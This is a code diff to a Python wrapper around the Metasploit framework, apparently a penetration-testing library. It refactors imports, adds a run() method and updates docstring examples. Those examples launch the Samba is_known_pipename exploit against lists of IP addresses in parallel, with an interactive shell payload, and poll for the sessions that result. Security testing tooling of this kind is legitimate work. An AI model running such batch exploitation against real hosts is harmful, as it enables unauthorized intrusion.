@@ -2,7 +2,7 @@
 
 import asyncio
 import time
-from typing import Any, Dict, List, Optional, Set, TYPE_CHECKING
+from typing import Any, List, Optional, Set, TYPE_CHECKING
 
 from .options import ModuleOptions
 
@@ -17,7 +17,9 @@ class Module:
     Provides intuitive access to module configuration and execution.
 
     Example:
-        module = msf.create_module("exploit/linux/samba/is_known_pipename")
+        from assassinate.msf import create_module
+
+        module = create_module("exploit/linux/samba/is_known_pipename")
 
         # Introspect
         print(module.author)
@@ -182,7 +184,7 @@ class Module:
             async def exploit_targets(targets):
                 tasks = []
                 for target in targets:
-                    module = msf.create_module("exploit/linux/samba/is_known_pipename")
+                    module = create_module("exploit/linux/samba/is_known_pipename")
                     module.options.RHOSTS = target
                     tasks.append(module.exploit_async("cmd/unix/interact"))
                 return await asyncio.gather(*tasks)
@@ -236,10 +238,12 @@ class Module:
             Job ID (as string) if job was started, None if it completed immediately
 
         Example:
+            from assassinate.msf import create_module, job_list, list_sessions, get_session
+
             # Launch multiple exploits in parallel
             jobs = []
             for target in ["192.168.1.100", "192.168.1.101"]:
-                module = msf.create_module("exploit/linux/samba/is_known_pipename")
+                module = create_module("exploit/linux/samba/is_known_pipename")
                 module.options.RHOSTS = target
                 job_id = module.exploit_job("cmd/unix/interact")
                 if job_id:
@@ -248,21 +252,25 @@ class Module:
             # Poll for sessions while jobs run
             import time
             seen_sessions = set()
-            while msf.job_list():
-                for sid in msf.list_sessions():
+            while job_list():
+                for sid in list_sessions():
                     if sid not in seen_sessions:
                         seen_sessions.add(sid)
-                        session = msf.get_session(sid)
+                        session = get_session(sid)
                         print(f"Got session on {session.host}!")
                 time.sleep(1)
         """
         return self._rust.exploit_job(payload)
 
+    def run(self) -> bool:
+        """Run an auxiliary module."""
+        return self._rust.run()
+
     # === Backward Compatibility ===
 
     def set_option(self, key: str, value: Any) -> None:
         """Set option value (prefer module.options.KEY = value)."""
-        self._rust.set_option(key, str(value))
+        self._rust._set_option(key, str(value))
 
     def __repr__(self) -> str:
         return f"<Module: {self.fullname}>"
